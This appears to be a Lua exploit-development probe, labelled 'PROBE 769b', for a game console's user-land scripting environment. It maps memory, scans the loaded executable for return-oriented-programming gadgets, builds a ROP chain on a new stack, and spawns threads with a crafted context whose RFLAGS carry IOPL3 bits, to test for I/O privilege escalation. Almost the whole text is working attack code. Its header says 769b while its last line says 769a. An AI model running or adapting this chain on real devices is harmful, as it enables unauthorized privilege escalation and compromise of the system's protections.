-- CRASH_CLASS: MODERATE
-- PROBE 769b: which context field becomes the child's RFLAGS?
--
-- 768a found lahf;ret (base+0x2B5FC) and no pushfq;pop. lahf reads
-- SF:ZF:AF:PF:CF into AH without privilege, so seeding a candidate field with
-- 0x246 (ZF|PF|IF) and reading AH right at thread entry distinguishes
-- "context flags honoured" (0x46) from "default user flags" (0x02).
print("=== PROBE 769b: CONTEXT RFLAGS ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function mmap(px)
    local ok,r=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    if not ok then return 0 end
    local a=to_num(r); if a>0 then zero(a,px) end; return a
end
local function find_pat(base,size,pat)
    local off,limit,chunk=0,size-0x20,0x8000
    while off<limit do
        local want=limit-off; if want>chunk then want=chunk end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
    return nil
end
local rb=mmap(0x8000)
if rb==0 then print("[A] mmap failed") return end
local cnt=to_num(memory.alloc(8)); wd(cnt,0)
call(mk(674),rb,72,512,cnt,0x40000000,0)
local n=rd(cnt) or 0
local ebase,bsz=nil,0
for i=0,math.min(n,512)-1 do
    local r=rb+i*72
    local a=rd(r)+(rd(r+4) or 0)*4294967296
    local b=rd(r+8)+(rd(r+12) or 0)*4294967296
    if rd(r+0x18)==5 and (b-a)>0x200000 and a<0x1000000000 and (b-a)>bsz then ebase,bsz=a,b-a end
end
if not ebase then print("[A] no eboot") return end
local lahf  =find_pat(ebase,bsz,string.char(0x9F,0xC3))
local popfq =find_pat(ebase,bsz,string.char(0x9D,0xC3))
local st_rsi=find_pat(ebase,bsz,string.char(0x48,0x89,0x06,0xC3))
local poprax=find_pat(ebase,bsz,string.char(0x58,0xC3))
local jmp_g =find_pat(ebase,bsz,string.char(0xEB,0xFE))
print(string.format("[A] eboot=%X lahf=%s popfq=%s store=%s jmp=%s",ebase,tostring(lahf),tostring(popfq),tostring(st_rsi),tostring(jmp_g)))
if not (lahf and st_rsi and poprax and jmp_g) then print("[A] missing gadgets") return end
local fn=to_num(syscall.pipe.fn_addr)
local stack=mmap(0x2000); local status=mmap(0x1000)
if stack==0 or status==0 then print("[A] mmap2 failed") return end
local base=stack+0x1000
local chain={lahf,st_rsi,poprax,431,fn,jmp_g}
for i=1,#chain do wq(base+(i-1)*8,chain[i]) end
local tid=to_num(memory.alloc(0x40))
local function child(off,flags,label)
    zero(status,0x1000); zero(tid,0x40)
    local ctx=to_num(memory.alloc(0x500)); zero(ctx,0x500)
    wq(ctx+0x108,uint64(0x480)); wq(ctx+0x110,uint64(0x10000))
    wq(ctx+0x0C0,uint64(0x43));  wq(ctx+0x100,uint64(0x3B))
    wq(ctx+0x0E0,uint64(fn));    wq(ctx+0x0F8,uint64(base))
    wq(ctx+0x050,uint64(status))
    wq(ctx+0x078,uint64(20))
    if off then wq(ctx+off,uint64(flags)) end
    local r=call(mk(430),ctx,tid,0,0,0,0)
    local v=0
    for i=1,60000 do v=rd(status) or 0; if v~=0 then break end end
    local ah=math.floor(v/256)%256
    local lowlo=v%65536
    print(string.format("[B] %-10s off=%s fl=%04X rv=%s stored=%08X AH=%02X low16=%04X iopl=%d",label,tostring(off),flags,tostring(r),v,ah,lowlo,math.floor(lowlo/4096)%4))
    return ah
end
local cases={{nil,0,"baseline"},{0x0F0,0x3246,"IOPL3"},{0x0F0,0x3246,"IOPL3b"}}
for _,c in ipairs(cases) do
    local ah=child(c[1],c[2],c[3])
    print(string.format("[C] AH=%02X iopl_bits=%d",ah,math.floor(ah/2)%4))
end
print("[D] health="..tostring(call(syscall.pipe,20,0,0,0,0,0,0)))
print("=== 769a DONE ===")
